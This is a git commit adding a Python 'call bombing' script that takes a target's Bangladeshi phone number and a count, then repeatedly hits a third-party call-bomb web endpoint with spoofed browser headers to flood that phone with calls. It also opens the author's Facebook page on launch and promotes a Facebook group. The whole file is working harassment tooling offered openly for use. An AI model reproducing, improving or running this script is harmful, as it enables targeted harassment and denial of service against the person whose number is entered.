2ff09d02aff04b3c020edbe87a72fba095494d38
AKASH DAS <123357036+akashmatli@users.noreply.github.com>
2023-09-01 23:06:05 +0600

    Add files via upload

---
+++ Call-up.py
@@ -0,0 +1,93 @@
+#hello
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://www.facebook.com/profile.php?id=100045564883036")
+logo3=("""
+\033[1;32m
+███████ ██      ██ ████████ ███████ 
+██      ██      ██    ██    ██      
+█████   ██      ██    ██    █████   
+██      ██      ██    ██    ██      
+███████ ███████ ██    ██    ███████ 
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ [🌺] AUTHOR    \033[1;91m: \033[1;92mAKASH  DAS                ┃
+┃ [🐼] TOOL      \033[1;91m: \033[1;92mCALL BOOMBING             ┃
+┃ [🐼] STATUS    \033[1;91m: \033[1;92mFREE                      ┃
+┃ [🐼] SYSTEM    \033[1;91m: \033[1;92mDATA && WIFI              ┃
+┃ [🐼] GITHUB    \033[1;91m: \033[1;92mAKASH -404-CYBER          ┃
+┃ [🐼] FACEBOOK  \033[1;91m: \033[1;92mAKASH DAS                 ┃
+┃ [🖤] WHATSAPP  \033[1;91m: \033[1;92m+880175404..75            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mCALL BOMBINg AMOUNT :~"))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://khalid10.xyz/Call-Bomb/ax-callbomb?UserName=6c676aa80961edebdc05b9472c72067a&Request/Call/To/Phone/AX=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+url2="https://khalid10.xyz/Call-Bomb/ax-callbomb?UserName=6c676aa80961edebdc05b9472c72067a&Request/Call/To/Phone/AX=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers2={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46mAKASH TERMUX WORLD")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mAKASH TERMUX WORLD")
+  else:
+    pass
+  
+  sent3=requests.get(url2,headers=headers2)
+  if sent3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mAKASH TERMUX WORLD")
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+Follow my fb gurup
+    https://facebook.com/groups/528058202631155/
+                     https://facebook.com/groups/528058202631155/
+                            https://facebook.com/groups/528058202631155/
+                            https://facebook.com/groups/528058202631155/
+                            https://facebook.com/groups/528058202631155/
+                            https://facebook.com/groups/528058202631155/
+                            
+ Follow my fb gurup🖤
+""")
